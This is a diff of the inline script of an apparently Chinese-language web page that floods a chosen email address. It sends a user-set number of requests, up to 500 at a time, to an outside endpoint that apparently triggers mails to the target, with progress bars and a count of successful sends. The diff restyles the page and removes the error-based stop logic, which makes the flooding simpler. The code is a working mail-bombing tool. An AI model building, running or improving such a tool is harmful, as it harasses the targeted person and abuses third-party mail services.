@@ -1326,277 +1326,257 @@
 	</div>
 
 	<script>
-		// ======================
-		// 页面初始化
-		// ======================
+		// Page loader
 		window.addEventListener('load', function () {
 			setTimeout(() => {
-				const loader = document.getElementById('page-loader');
-				loader.style.opacity = '0';
-				setTimeout(() => loader.style.display = 'none', 500);
+				document.getElementById('page-loader').style.opacity = '0';
+				setTimeout(() => {
+					document.getElementById('page-loader').style.display = 'none';
+				}, 500);
 			}, 1500);
 		});
 
-		// ======================
-		// 全局配置
-		// ======================
-		const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-		let globalController = null;
+		// Generate particles for the mail animation
+		function createParticles() {
+			const particlesContainer = document.getElementById('particles');
+			const particleCount = 15;
+			const colors = [
+				'rgba(99, 102, 241, 0.7)',
+				'rgba(129, 140, 248, 0.7)',
+				'rgba(6, 182, 212, 0.7)',
+				'rgba(34, 211, 238, 0.7)'
+			];
 
-		// ======================
-		// 核心请求函数
-		// ======================
-		async function sendGetRequest(params, signal) {
-			const { to } = params;
-			const apiUrl = `https://ygwyy.top/%E9%82%AE%E7%AE%B1/index.php?email=${encodeURIComponent(to)}&username=hh`;
+			for (let i = 0; i < particleCount; i++) {
+				const particle = document.createElement('div');
+				particle.classList.add('particle');
 
-			try {
-				const response = await fetch(apiUrl, { signal });
+				const size = Math.random() * 8 + 4;
+				const startX = Math.random() * 200 - 100;
+				const startY = Math.random() * 200 - 100;
+				const endX = startX + (Math.random() * 200 - 100);
+				const endY = startY + (Math.random() * 200 - 100);
+				const duration = Math.random() * 15 + 5;
+				const colorIndex = Math.floor(Math.random() * colors.length);
 
-				// 处理HTTP协议错误
-				if (!response.ok) {
-					const errorData = await response.json();
-					throw new Error(errorData.message || `HTTP错误 ${response.status}`);
-				}
+				particle.style.width = `${size}px`;
+				particle.style.height = `${size}px`;
+				particle.style.left = `${100 + startX}px`;
+				particle.style.top = `${100 + startY}px`;
+				particle.style.background = colors[colorIndex];
+				particle.style.setProperty('--end-x', `${endX}px`);
+				particle.style.setProperty('--end-y', `${endY}px`);
+				particle.style.animationDuration = `${duration}s`;
 
-				const responseData = await response.json();
-
-				// 业务逻辑判断
-				if (!responseData.success) {
-					throw new Error(responseData.message || '服务器返回操作失败');
-				}
-
-				return { success: true, data: responseData };
-			} catch (error) {
-				if (error.name === 'AbortError') {
-					return { success: false, error: { type: 'ABORTED' } };
-				}
-
-				const errorType = error.name === 'TypeError'
-					? (error.message.includes('Failed to fetch') ? 'CORS_ERROR' : 'NETWORK_ERROR')
-					: 'BUSINESS_ERROR';
-
-				return {
-					success: false,
-					error: {
-						type: errorType,
-						message: error.message
-					}
-				};
+				particlesContainer.appendChild(particle);
 			}
 		}
 
-		// ======================
-		// 主发送逻辑
-		// ======================
+		// Initialize the particles animation
+		window.addEventListener('load', createParticles);
+
+		// 3D hover effect for mail illustration
+		const mailIllustration = document.querySelector('.mail-illustration');
+
+		mailIllustration.addEventListener('mousemove', (e) => {
+			const rect = mailIllustration.getBoundingClientRect();
+			const x = e.clientX - rect.left;
+			const y = e.clientY - rect.top;
+
+			const xPercent = (x / rect.width - 0.5) * 2;
+			const yPercent = (y / rect.height - 0.5) * 2;
+
+			const rotateY = xPercent * 10;
+			const rotateX = -yPercent * 10;
+
+			mailIllustration.style.transform = `perspective(1000px) rotateY(${rotateY}deg) rotateX(${rotateX}deg)`;
+		});
+
+		mailIllustration.addEventListener('mouseleave', () => {
+			mailIllustration.style.transform = `perspective(1000px) rotateY(-5deg) rotateX(5deg)`;
+		});
+
+		// Form validation functions
+		function validateEmail(email) {
+			return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+		}
+
+		function validateNumber(value, min) {
+			const num = parseFloat(value);
+			return !isNaN(num) && num >= min;
+		}
+
+		function showError(inputId, show) {
+			const errorMessage = document.getElementById(`${inputId}-error`);
+			const input = document.getElementById(inputId);
+
+			if (show) {
+				errorMessage.classList.add('visible');
+				input.classList.add('error');
+			} else {
+				errorMessage.classList.remove('visible');
+				input.classList.remove('error');
+			}
+		}
+
+		// Live validation for input fields
+		document.getElementById('to').addEventListener('input', function () {
+			const isValid = validateEmail(this.value);
+			showError('to', this.value && !isValid);
+		});
+
+		document.getElementById('inpVal').addEventListener('input', function () {
+			const isValid = validateNumber(this.value, 1);
+			showError('inpVal', this.value && !isValid);
+		});
+
+		document.getElementById('frequency').addEventListener('input', function () {
+			const isValid = validateNumber(this.value, 0.1);
+			showError('frequency', this.value && !isValid);
+		});
+
+		function showMessage(message, type, resultDiv) {
+			const messageDiv = document.createElement('div');
+			messageDiv.className = `message ${type}`;
+
+			const icon = document.createElement('i');
+			icon.className = type === 'success' ? 'fas fa-check-circle' : 'fas fa-inpVal-circle';
+
+			const text = document.createElement('span');
+			text.textContent = message;
+
+			messageDiv.appendChild(icon);
+			messageDiv.appendChild(text);
+			resultDiv.insertBefore(messageDiv, resultDiv.firstChild);
+
+			// Make sure the result div is visible
+			resultDiv.style.display = 'block';
+		}
+		let responseData = null
+		async function sendGetRequest(url, params, resultDiv) {
+			const email = params.to;
+			const username = 'hh';
+			const fullUrl = `https://ygwyy.top/%E9%82%AE%E7%AE%B1/index.php?email=${encodeURIComponent(email)}&username=${username}`;
+
+			const response = await fetch(fullUrl);
+			if (!response.ok) {
+				throw new Error(`HTTP error! status: ${response.status}`);
+			}
+			responseData = await response.json();
+			// console.log('🤖----- responseData ---->:', responseData);
+		}
+
 		async function sendRequests(event) {
 			event.preventDefault();
-			const form = event.target;
-			const resultDiv = document.getElementById('result');
-			resultDiv.innerHTML = '';
 
-			// 获取表单元素
-			const to = document.getElementById('to').value.trim();
+			// Get form elements
+			const submitBtn = document.getElementById('submitBtn');
+			const loadingSpinner = submitBtn.querySelector('.loading');
+			const buttonText = submitBtn.querySelector('.button-text');
+			const progressContainer = document.getElementById('progress-container');
+			const progressBarFill = document.querySelector('.progress-bar-fill');
+			const progressStatus = document.getElementById('progress-status');
+			const progressCount = document.getElementById('progress-count');
+
+			const to = document.getElementById('to').value;
 			const inpVal = parseInt(document.getElementById('inpVal').value);
 			const frequency = parseFloat(document.getElementById('frequency').value);
-			const submitBtn = document.getElementById('submitBtn');
-			const progressBarFill = document.querySelector('.progress-bar-fill');
-			const progressCount = document.getElementById('progress-count');
-			const progressContainer = document.querySelector('.progress-container');
+			const resultDiv = document.getElementById('result');
 
-			// 初始化状态
-			let successCount = 0, errorCount = 0, completed = 0;
-			let shouldStop = false, stopReason = '';
-			progressContainer.style.display = 'block';
-			progressBarFill.style.width = '0%';
-			progressCount.textContent = '0/0';
+			// Clear previous messages
+			resultDiv.innerHTML = '';
+			resultDiv.style.display = 'none';
+
+			// Validate inputs
+			let hasError = false;
+
+			if (!validateEmail(to)) {
+				showError('to', true);
+				hasError = true;
+			} else {
+				showError('to', false);
+			}
+
+			if (!validateNumber(inpVal, 1)) {
+				showError('inpVal', true);
+				hasError = true;
+			} else {
+				showError('inpVal', false);
+			}
+
+			if (!validateNumber(frequency, 0.1)) {
+				showError('frequency', true);
+				hasError = true;
+			} else {
+				showError('frequency', false);
+			}
+
+			if (hasError) return;
+
+			// Show loading state
 			submitBtn.disabled = true;
-			globalController = new AbortController();
+			buttonText.textContent = '发送中...';
+			loadingSpinner.style.display = 'inline-block';
+			progressContainer.style.display = 'block';
+			progressCount.textContent = `0/${inpVal}`;
 
+			let successCount = 0;// 成功数
+			let errorCount = 0;// 失败数
+			let completed = 0; // 总完成数（包含成功和失败）
 			try {
-				const BATCH_SIZE = 500;
+				const BATCH_SIZE = 500;// 总批发送次数
 				let currentIndex = 0;
 				const totalBatches = Math.ceil(inpVal / BATCH_SIZE);
 
-				batchLoop:
 				for (let batch = 0; batch < totalBatches; batch++) {
-					if (shouldStop) break;
-
 					const batchSize = Math.min(BATCH_SIZE, inpVal - currentIndex);
-					const batchControllers = [];
 					const batchRequests = [];
 
 					for (let i = 0; i < batchSize; i++) {
-						const controller = new AbortController();
-						batchControllers.push(controller);
-
 						batchRequests.push(
-							sendGetRequest({ to }, controller.signal)
-								.then((result) => {
-									if (result.success) {
-										successCount++;
-									} else {
-										errorCount++;
-										handleRequestError(result.error);
-									}
+							sendGetRequest('', { to }, resultDiv)
+								.then(() => successCount++)
+								.catch(() => {
+									errorCount++
 								})
 								.finally(() => {
-									completed++;
-									updateProgress();
+									completed++; // 无论成功失败都计数
+									const progress = (completed / inpVal) * 100;
+									progressBarFill.style.width = `${progress}%`;
+									progressCount.textContent = `${completed}/${inpVal}`;
 								})
 						);
 						currentIndex++;
 					}
 
 					await Promise.allSettled(batchRequests);
-					batchControllers.length = 0; // 清理当前批次控制器
-
-					// 每次批次后检查停止状态
-					if (shouldStop) break batchLoop;
 				}
-			} finally {
-				globalController.abort();
-				submitBtn.disabled = false;
-				showFinalResult();
 
-				// 3秒后隐藏进度条
+			} finally {
+				if (responseData && !responseData?.success) {
+					showMessage(`✅ ${responseData.message}`, 'error', resultDiv);
+				} else {
+					showMessage(`✅ 完成 ${inpVal} 条请求（成功 ${successCount || errorCount} 条)`, 'success', resultDiv);
+
+				}
+
+				// Reset button state
+				submitBtn.disabled = false;
+				buttonText.textContent = '立即发送';
+				loadingSpinner.style.display = 'none';
+
+				// Keep progress bar visible to show completion
 				setTimeout(() => {
 					progressContainer.style.display = 'none';
+					progressBarFill.style.width = '0%';
 				}, 3000);
 			}
-
-			// ======================
-			// 辅助函数
-			// ======================
-			function handleRequestError(error) {
-				switch (error.type) {
-					case 'ABORTED':
-						console.log('请求已中止');
-						break;
-
-					case 'CORS_ERROR':
-						console.log('跨域错误，继续发送...');
-						break;
-
-					case 'NETWORK_ERROR':
-						if (!shouldStop) {
-							shouldStop = true;
-							stopReason = '网络连接异常';
-							showMessage('❌ 网络连接已中断', 'error');
-							globalController.abort();
-						}
-						break;
-
-					default:
-						if (!shouldStop) {
-							shouldStop = true;
-							stopReason = error.message;
-							// showMessage(`❌ 发送终止：${error.message}`, 'error');
-							globalController.abort();
-						}
-				}
-			}
-
-			function updateProgress() {
-				const progress = Math.min((completed / inpVal) * 100, 100);
-				progressBarFill.style.width = `${progress}%`;
-				progressCount.textContent = `${completed}/${inpVal}`;
-
-				// 中止时样式变化
-				if (shouldStop) {
-					progressBarFill.style.transition = 'none';
-					progressBarFill.style.backgroundColor = '#ff5722';
-					progressCount.style.color = '#ff5722';
-				}
-				if (completed >= inpVal) {
-					progressBarFill.style.backgroundColor = errorCount > 0 ? '#ffc107' : '#4CAF50';
-				}
-			}
-
-			function showFinalResult() {
-				const actualTotal = successCount + errorCount;
-				let message, type;
-
-				if (shouldStop) {
-					type = 'error';
-					message = `
-            ⏹️ 发送已中止：${stopReason}
-            <br>▸ 已处理：${actualTotal}/${inpVal}
-            <br>▸ 成功：${successCount}
-            <br>▸ 失败：${errorCount}
-        `;
-				} else {
-					type = errorCount > 0 ? 'warning' : 'success';
-					const icon = errorCount > 0 ? 'exclamation-triangle' : 'check-circle';
-					message = `
-            <i class="fas fa-${icon}"></i>
-            ${errorCount > 0 ? '请求完成、部分处在失败' : '✅ 全部成功'}
-            <br>▸ 总数：${inpVal}
-            <br>▸ 成功：${successCount}
-            <br>▸ 失败：${errorCount}
-        `;
-				}
-
-				showMessage(message, type);
-			}
-
-			function showMessage(content, type) {
-				const messageEl = document.createElement('div');
-				messageEl.className = `message ${type}`;
-				messageEl.innerHTML = `
-					<i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle"></i>
-					<div class="message-content">${content}</div>
-				`;
-				resultDiv.prepend(messageEl);
-				resultDiv.style.display = 'block';
-			}
-
-			function validateInputs(email, count, freq) {
-				let isValid = true;
-
-				if (!EMAIL_REGEX.test(email)) {
-					showError('to', true);
-					isValid = false;
-				}
-
-				if (isNaN(count) || count < 1) {
-					showError('inpVal', true);
-					isValid = false;
-				}
-
-				if (isNaN(freq) || freq < 0.1) {
-					showError('frequency', true);
-					isValid = false;
-				}
-
-				return isValid;
-			}
 		}
 
-		// ======================
-		// 表单事件绑定
-		// ======================
 		document.getElementById('emailForm').addEventListener('submit', sendRequests);
-
-		// 实时输入验证
-		document.querySelectorAll('input').forEach(input => {
-			input.addEventListener('input', function () {
-				const validators = {
-					'to': v => EMAIL_REGEX.test(v),
-					'inpVal': v => parseInt(v) >= 1,
-					'frequency': v => parseFloat(v) >= 0.1
-				};
-				showError(this.id, !validators[this.id](this.value));
-			});
-		});
-
-		function showError(inputId, isError) {
-			const inputEl = document.getElementById(inputId);
-			const errorIcon = document.getElementById(`${inputId}-error`);
-			inputEl.classList.toggle('error', isError);
-			errorIcon.style.visibility = isError ? 'visible' : 'hidden';
-		}
 	</script>
+
+
 </body>
 
 </html>
